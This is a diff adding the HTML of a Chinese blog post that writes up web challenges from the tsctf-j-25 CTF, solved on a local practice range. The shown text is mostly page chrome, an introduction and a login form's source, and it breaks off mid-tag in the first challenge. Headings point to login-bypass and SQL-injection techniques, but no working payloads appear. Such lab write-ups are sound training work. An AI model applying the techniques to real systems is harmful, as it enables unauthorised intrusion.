@@ -1,0 +1,993 @@
+<!doctype html>
+
+<html lang="zh-CN" data-fancybox-enabled="1">
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="theme-color" content="#f7f3e9" data-flatpaper-theme-color>
+
+<title>tsctf-j-25 web-write-up | aClosure&#39;s奇妙的妙妙据点</title>
+<meta name="description" content="中秋节开始的一些尝试和学习……过几天应该会发杂谈，应该？">
+<meta property="og:type" content="article">
+<meta property="og:title" content="tsctf-j-25 web-write-up | aClosure&#39;s奇妙的妙妙据点">
+<meta property="og:url" content="https://aclosure.github.io/2026/09/26/ctfgame/tsctf-j-25/">
+<meta property="og:site_name" content="aClosure&#39;s奇妙的妙妙据点">
+<meta property="og:description" content="中秋节开始的一些尝试和学习……过几天应该会发杂谈，应该？">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://aclosure.github.io/images/cover/06.webp">
+<meta property="article:published_time" content="2026-09-26T13:20:33.000Z">
+<meta property="article:modified_time" content="2026-10-10T03:17:51.951Z">
+<meta property="article:author" content="kur0sia!">
+<meta property="article:tag" content="dev">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://aclosure.github.io/images/cover/06.webp">
+<link rel="canonical" href="https://aclosure.github.io/2026/09/26/ctfgame/tsctf-j-25/">
+
+<link rel="icon" href="/images/Ak_char_007_closre_3.png" type="image/png">
+
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"tsctf-j-25 web-write-up","name":"tsctf-j-25 web-write-up | aClosure's奇妙的妙妙据点","description":"中秋节开始的一些尝试和学习……过几天应该会发杂谈，应该？","url":"https://aclosure.github.io/2026/09/26/ctfgame/tsctf-j-25/","inLanguage":"zh-CN","isPartOf":{"@type":"WebSite","name":"aClosure's奇妙的妙妙据点","url":"https://aclosure.github.io/"},"image":["https://aclosure.github.io/images/cover/06.webp"],"mainEntityOfPage":"https://aclosure.github.io/2026/09/26/ctfgame/tsctf-j-25/","datePublished":"2026-09-26T13:20:33.000Z","dateModified":"2026-10-10T03:17:51.951Z","author":{"@type":"Person","name":"kur0sia!"},"publisher":{"@type":"Organization","name":"aClosure's奇妙的妙妙据点"},"keywords":"dev"}</script>
+
+<script>
+  (function () {
+    var accents = { orange: 1, purple: 1, sakura: 1, blue: 1, pink: 1, green: 1, black: 1 };
+    var match = document.cookie.match(/(?:^|;\s*)flatpaper-accent=([^;]+)/);
+    var accent = 'green';
+    if (match) {
+      try { accent = decodeURIComponent(match[1]); } catch (e) {}
+    }
+    if (!accents[accent]) accent = 'green';
+    document.documentElement.setAttribute('data-accent', accent);
+    try {
+      if (localStorage.getItem('flatpaper-mode') === 'dark') {
+        document.documentElement.classList.add('dark-mode');
+      }
+    } catch (e) {}
+  })();
+</script>
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css">
+<script defer src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js"></script>
+
+
+  
+  <link rel="sitemap" type="application/xml" title="Sitemap" href="/sitemap.xml">
+  
+  <style>
+  .fp-progress {
+    position: fixed;
+    top: 0; left: 0; right: 0;
+    height: 3px;
+    z-index: 30;
+    pointer-events: none;
+    background: var(--color-accent);
+    transform: scaleX(0);
+    transform-origin: 0 50%;
+    display: none;
+  }
+  body.is-post .fp-progress { display: block; }
+  @supports (animation-timeline: scroll()) {
+    body.is-post .fp-progress {
+      animation-name: fp-progress-grow;
+      animation-duration: auto;
+      animation-timing-function: linear;
+      animation-timeline: scroll(root block);
+    }
+  }
+  @keyframes fp-progress-grow {
+    from { transform: scaleX(0); }
+    to { transform: scaleX(1); }
+  }
+  @media (prefers-reduced-motion: reduce) {
+    .fp-progress { display: none !important; }
+  }
+</style>
+
+  
+  <style>
+  .fp-bgm {
+    position: fixed;
+    left: 26px;
+    bottom: 26px;
+    z-index: 40;
+    display: inline-grid;
+    place-items: center;
+    width: 44px;
+    height: 44px;
+    padding: 0;
+    border: 1px dashed var(--dash);
+    border-radius: 50%;
+    color: var(--ink-soft);
+    background: var(--paper-warm);
+    box-shadow: 0 6px 16px rgba(var(--paper-shadow-rgb), 0.16);
+    cursor: pointer;
+    transition: color .2s ease, border-color .2s ease, transform .2s ease;
+  }
+  .fp-bgm[hidden] { display: none; }
+  .fp-bgm svg { width: 18px; height: 18px; }
+  .fp-bgm:hover, .fp-bgm:focus-visible {
+    color: var(--color-accent-strong);
+    border-color: var(--color-accent-soft);
+  }
+  .fp-bgm:active { transform: scale(.94); }
+  .fp-bgm.is-playing {
+    color: var(--color-accent-strong);
+    border-color: var(--color-accent-muted);
+  }
+  .dark-mode .fp-bgm.is-playing { color: var(--color-accent-muted); }
+  .fp-bgm.is-playing::after {
+    content: "";
+    position: absolute;
+    inset: -1px;
+    border-radius: 50%;
+    border: 1px solid color-mix(in srgb, var(--color-accent) 45%, transparent);
+    animation: fp-bgm-pulse 2.4s ease-out infinite;
+    pointer-events: none;
+  }
+  @keyframes fp-bgm-pulse {
+    0%   { transform: scale(1);   opacity: .75; }
+    100% { transform: scale(1.4); opacity: 0; }
+  }
+  @media (prefers-reduced-motion: reduce) {
+    .fp-bgm.is-playing::after { display: none; }
+  }
+  @media (max-width: 640px) {
+    .fp-bgm { left: 16px; bottom: 16px; width: 40px; height: 40px; }
+    .fp-bgm svg { width: 16px; height: 16px; }
+  }
+</style>
+
+  
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="aClosure's奇妙的妙妙据点" type="application/atom+xml">
+</head>
+
+<body
+  class="is-post tag-style-tape bg-style-default"
+  data-default-accent="green"
+  data-code-theme="simple"
+  data-note-style="sticky"
+  data-note-icons="on"
+  data-button-style="circle"
+  data-strong-accent="on"
+>
+  
+    <div class="page-grain"></div>
+  
+  <svg width="0" height="0" style="position:absolute;z-index:-1;" aria-hidden="true">
+    <defs>
+      <filter id="paper-edge" x="-5%" y="-5%" width="110%" height="110%">
+        <feTurbulence type="fractalNoise" baseFrequency="0.04" result="noise" />
+        <feDisplacementMap in="SourceGraphic" in2="noise" scale="3" xChannelSelector="R" yChannelSelector="G" />
+      </filter>
+    </defs>
+  </svg>
+  
+  <header class="site-header">
+  
+  <button class="icon-button js-sidebar-toggle sidebar-toggle" type="button" aria-label="打开侧边栏" aria-controls="paper-sidebar-drawer" aria-expanded="false">
+    
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-menu flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-menu"></use></svg>
+
+  </button>
+
+  <div class="brand">
+    <div class="brand-mark-wrapper">
+      
+        <a class="brand-mark" href="/" aria-label="FlatPaper 首页">
+          
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-layout-grid flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-layout-grid"></use></svg>
+
+        </a>
+      
+    </div>
+    <a class="brand-text" href="/">aClosure&#39;s奇妙的妙妙据点</a>
+  </div>
+
+  <nav class="site-nav" aria-label="主导航">
+    
+      
+        <a class="site-nav-link " href="/">
+          
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-house flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-house"></use></svg>
+
+          <span>首页</span>
+        </a>
+      
+    
+      
+        <a class="site-nav-link " href="/links/">
+          
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-link flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-link"></use></svg>
+
+          <span>友链</span>
+        </a>
+      
+    
+      
+        <a class="site-nav-link " href="/fcircle/">
+          
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-users flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-users"></use></svg>
+
+          <span>朋友圈</span>
+        </a>
+      
+    
+      
+        <a class="site-nav-link " href="/about/">
+          
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-user flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-user"></use></svg>
+
+          <span>关于</span>
+        </a>
+      
+    
+      
+        <div class="site-nav-item has-children">
+          <button class="site-nav-link site-nav-parent" type="button" aria-haspopup="true" aria-expanded="false">
+            
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-folder flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-folder"></use></svg>
+
+            <span>文章</span>
+          </button>
+          <div class="site-nav-menu" role="menu">
+            
+              <a role="menuitem" class="" href="/categories/">
+                
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-folder flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-folder"></use></svg>
+
+                <span>分类</span>
+              </a>
+            
+              <a role="menuitem" class="" href="/tags/">
+                
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-tag flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-tag"></use></svg>
+
+                <span>标签</span>
+              </a>
+            
+              <a role="menuitem" class="" href="/archives/">
+                
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-archive flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-archive"></use></svg>
+
+                <span>归档</span>
+              </a>
+            
+          </div>
+        </div>
+      
+    
+  </nav>
+
+  <div class="header-tools">
+    <button class="icon-button js-search-open" type="button" aria-label="搜索文章">
+      
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-search flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-search"></use></svg>
+
+    </button>
+    <div class="accent-picker">
+      <button class="icon-button accent-toggle" type="button" aria-label="选择主题色" title="选择主题色" aria-haspopup="true" aria-expanded="false" aria-controls="accent-menu">
+        
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-palette flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-palette"></use></svg>
+
+      </button>
+      <div class="accent-menu" id="accent-menu" role="menu" aria-label="主题色">
+        <button type="button" class="accent-option" role="menuitemradio" aria-label="橙色" aria-checked="false" data-accent-option="orange">
+          <span class="accent-swatch accent-swatch--orange" aria-hidden="true"></span>
+        </button>
+        <button type="button" class="accent-option" role="menuitemradio" aria-label="紫色" aria-checked="false" data-accent-option="purple">
+          <span class="accent-swatch accent-swatch--purple" aria-hidden="true"></span>
+        </button>
+        <button type="button" class="accent-option" role="menuitemradio" aria-label="樱花粉" aria-checked="false" data-accent-option="sakura">
+          <span class="accent-swatch accent-swatch--sakura" aria-hidden="true"></span>
+        </button>
+        <button type="button" class="accent-option" role="menuitemradio" aria-label="蓝色" aria-checked="false" data-accent-option="blue">
+          <span class="accent-swatch accent-swatch--blue" aria-hidden="true"></span>
+        </button>
+        <button type="button" class="accent-option" role="menuitemradio" aria-label="粉色" aria-checked="false" data-accent-option="pink">
+          <span class="accent-swatch accent-swatch--pink" aria-hidden="true"></span>
+        </button>
+        <button type="button" class="accent-option" role="menuitemradio" aria-label="绿色" aria-checked="false" data-accent-option="green">
+          <span class="accent-swatch accent-swatch--green" aria-hidden="true"></span>
+        </button>
+        <button type="button" class="accent-option" role="menuitemradio" aria-label="黑色" aria-checked="false" data-accent-option="black">
+          <span class="accent-swatch accent-swatch--black" aria-hidden="true"></span>
+        </button>
+      </div>
+    </div>
+    <button class="theme-toggle" type="button" aria-label="切换颜色模式">
+      <span class="theme-icon theme-icon--sun">
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-sun flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-sun"></use></svg>
+</span>
+      <span class="theme-icon theme-icon--moon">
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-moon flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-moon"></use></svg>
+</span>
+    </button>
+  </div>
+</header>
+
+
+  
+  <main class="paper-shell paper-shell--article">
+    
+
+<aside id="paper-sidebar-drawer" class="paper-sidebar paper-sidebar--right" aria-label="侧边栏">
+  <div class="drawer-toolbar" aria-label="侧边栏工具">
+    <div class="drawer-accent-options" role="group" aria-label="主题色">
+      <button type="button" class="accent-option" aria-label="橙色" aria-pressed="false" data-accent-option="orange">
+        <span class="accent-swatch accent-swatch--orange" aria-hidden="true"></span>
+      </button>
+      <button type="button" class="accent-option" aria-label="紫色" aria-pressed="false" data-accent-option="purple">
+        <span class="accent-swatch accent-swatch--purple" aria-hidden="true"></span>
+      </button>
+      <button type="button" class="accent-option" aria-label="樱花粉" aria-pressed="false" data-accent-option="sakura">
+        <span class="accent-swatch accent-swatch--sakura" aria-hidden="true"></span>
+      </button>
+      <button type="button" class="accent-option" aria-label="蓝色" aria-pressed="false" data-accent-option="blue">
+        <span class="accent-swatch accent-swatch--blue" aria-hidden="true"></span>
+      </button>
+      <button type="button" class="accent-option" aria-label="粉色" aria-pressed="false" data-accent-option="pink">
+        <span class="accent-swatch accent-swatch--pink" aria-hidden="true"></span>
+      </button>
+      <button type="button" class="accent-option" aria-label="绿色" aria-pressed="false" data-accent-option="green">
+        <span class="accent-swatch accent-swatch--green" aria-hidden="true"></span>
+      </button>
+      <button type="button" class="accent-option" aria-label="黑色" aria-pressed="false" data-accent-option="black">
+        <span class="accent-swatch accent-swatch--black" aria-hidden="true"></span>
+      </button>
+    </div>
+    <button class="icon-button drawer-close js-sidebar-close" type="button" aria-label="关闭侧边栏">
+      
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-x flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-x"></use></svg>
+
+    </button>
+  </div>
+
+  <section class="side-card nav-card">
+    <nav class="site-nav-drawer" aria-label="移动端导航">
+      
+        
+          <a class="" href="/">
+            
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-house flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-house"></use></svg>
+
+            <span>首页</span>
+          </a>
+        
+      
+        
+          <a class="" href="/links/">
+            
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-link flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-link"></use></svg>
+
+            <span>友链</span>
+          </a>
+        
+      
+        
+          <a class="" href="/fcircle/">
+            
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-users flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-users"></use></svg>
+
+            <span>朋友圈</span>
+          </a>
+        
+      
+        
+          <a class="" href="/about/">
+            
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-user flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-user"></use></svg>
+
+            <span>关于</span>
+          </a>
+        
+      
+        
+          <div class="drawer-nav-group">
+            <button class="drawer-nav-parent" type="button" aria-expanded="false">
+              
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-folder flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-folder"></use></svg>
+
+              <span>文章</span>
+            </button>
+            <div class="drawer-nav-children">
+              
+                <a class="" href="/categories/">
+                  
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-folder flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-folder"></use></svg>
+
+                  <span>分类</span>
+                </a>
+              
+                <a class="" href="/tags/">
+                  
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-tag flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-tag"></use></svg>
+
+                  <span>标签</span>
+                </a>
+              
+                <a class="" href="/archives/">
+                  
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-archive flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-archive"></use></svg>
+
+                  <span>归档</span>
+                </a>
+              
+            </div>
+          </div>
+        
+      
+    </nav>
+  </section>
+
+  <section class="side-card profile-card">
+    
+      <div class="avatar avatar--image avatar--circle">
+        <img src="/images/avatar.jpg" alt="kur0sia!" loading="lazy" referrerpolicy="no-referrer">
+      </div>
+    
+    <h3>kur0sia!</h3>
+    <p class="profile-role">kur0sia!</p>
+    <p>Ciallo～(∠・ω&lt; )⌒★</p>
+    
+      <div class="site-info" aria-label="站点信息">
+        
+          
+            <a class="site-info__item" href="/archives/">
+              <strong>20</strong>
+              <span>文章</span>
+            </a>
+          
+        
+          
+            <a class="site-info__item" href="/categories/">
+              <strong>4</strong>
+              <span>分类</span>
+            </a>
+          
+        
+          
+            <a class="site-info__item" href="/tags/">
+              <strong>6</strong>
+              <span>标签</span>
+            </a>
+          
+        
+      </div>
+    
+    <div class="socials">
+      
+        <a href="https://github.com/aClosure" target="_blank" rel="noopener" aria-label="GitHub" data-tooltip="GitHub">
+          
+            
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 496 512" fill="currentColor" class="lucide lucide-github flatpaper-icon flatpaper-icon--fa-brands" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-fa-brands-github"></use></svg>
+
+          
+        </a>
+      
+        <a href="mailto:kur0sia@foxmail.com" target="_blank" rel="noopener" aria-label="Email" data-tooltip="Email">
+          
+            
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-mail flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-mail"></use></svg>
+
+          
+        </a>
+      
+        <a href="https://space.bilibili.com/526444768" target="_blank" rel="noopener" aria-label="Bilibili" data-tooltip="Bilibili">
+          
+            
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 512 512" fill="currentColor" class="lucide lucide-bilibili flatpaper-icon flatpaper-icon--fa-brands" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-fa-brands-bilibili"></use></svg>
+
+          
+        </a>
+      
+        <a href="https://steamcommunity.com/profiles/76561199202663392" target="_blank" rel="noopener" aria-label="Steam" data-tooltip="Steam">
+          
+            
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 496 512" fill="currentColor" class="lucide lucide-steam flatpaper-icon flatpaper-icon--fa-brands" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-fa-brands-steam"></use></svg>
+
+          
+        </a>
+      
+        <a href="https://weibo.com/u/7733852433" target="_blank" rel="noopener" aria-label="Weibo" data-tooltip="Weibo">
+          
+            
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 512 512" fill="currentColor" class="lucide lucide-weibo flatpaper-icon flatpaper-icon--fa-brands" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-fa-brands-weibo"></use></svg>
+
+          
+        </a>
+      
+        <a href="https://user.qzone.qq.com/3131474973/infocenter" target="_blank" rel="noopener" aria-label="Mastodon" data-tooltip="在 QQ 找我!">
+          
+            
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-imagesconst-imgqqwebp flatpaper-icon" aria-hidden="true"><circle cx="12" cy="12" r="3"/></svg>
+
+          
+        </a>
+      
+      
+        
+        
+        <a href="/atom.xml" aria-label="RSS feed" data-tooltip="RSS feed">
+          
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-rss flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-rss"></use></svg>
+
+        </a>
+      
+    </div>
+  </section>
+
+  
+
+  
+    <div class="post-sticky-stack">
+      <section class="side-card toc-card">
+        <header class="toc-card__head">
+          <h2>
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-table-of-contents flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-table-of-contents"></use></svg>
+文章目录</h2>
+          <button type="button" class="toc-toggle-all" data-action="toggle-toc" aria-pressed="false" aria-label="展开全部目录" title="展开全部目录">
+            
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-chevron-down flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-chevron-down"></use></svg>
+
+          </button>
+        </header>
+        <div class="toc-content">
+          
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#T1-EZ-login"><span class="toc-text">T1-EZ_login</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9A%E8%BF%9B%E5%85%A5%EF%BC%9A"><span class="toc-text">刚进入：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%95%E9%AA%8C%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%EF%BC%9A"><span class="toc-text">试验登录逻辑：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#T2-ez-sql"><span class="toc-text">T2-ez_sql</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%90-%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E6%8A%A5%E8%BF%99%E4%B8%AA%E9%94%99%EF%BC%9F"><span class="toc-text">🧐 为什么会报这个错？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#T3-ez-py"><span class="toc-text">T3-ez_py</span></a></li></ol>
+          
+        </div>
+      </section>
+      
+
+
+    </div>
+  
+
+  
+
+</aside>
+
+    <section class="paper-main">
+      
+
+<div class="article-tape-wrap">
+<span class="tape tape--top-right" aria-hidden="true"></span>
+<article class="article-paper article-paper--with-top-img">
+  
+    <figure class="article-top-img" aria-label="tsctf-j-25 web-write-up">
+      <img src="/images/cover/06.webp" alt="" loading="eager" fetchpriority="high" referrerpolicy="no-referrer" draggable="false">
+    </figure>
+  
+  <header class="article-header">
+    
+      <a class="label-pill" href="/categories/ctfer/">
+        
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-folder flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-folder"></use></svg>
+
+        ctfer
+      </a>
+    
+    <h1>tsctf-j-25 web-write-up</h1>
+    <div class="meta-line meta-line--article">
+      <span class="meta-date">
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-calendar flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-calendar"></use></svg>
+2026-09-26</span>
+      
+        <span class="meta-tags">
+          
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-tag flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-tag"></use></svg>
+
+          <a class="meta-tag-link" href="/tags/dev/">#dev</a>
+        </span>
+      
+    </div>
+  </header>
+
+  
+
+
+  <div class="article-content">
+    <p>在这个中秋假的第二天，经历了两天的出门<s>瞎逛</s>后，kur0sia决定继续他的ctf题目，并用docker在本地靶场做了第一道web题。他尚且不知道自己能不能在国庆后的招新赛中进入天璇merak，也不知道自己使用agent的实际操作到底能不能通过之后的wp，就这样在宿舍里头看着我们的题目……总之，clo是决定要先看看去年题，来准备一下招新了！</p>
+<h2 id="T1-EZ-login">T1-EZ_login</h2>
+<p>这题说实话可一点都不easy…综合程度比moe难了不少：</p>
+<h3 id="刚进入：">刚进入：</h3>
+<p>刚进入显示一个登陆系统，有用户名，密码，验证码三栏。用户名就是admin，密码未知，验证码……看着挺好的。我们没有入手点，先看源码吧：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;login-container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>管理员登录<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/login&quot;</span> <span class="attr">method</span>=<span 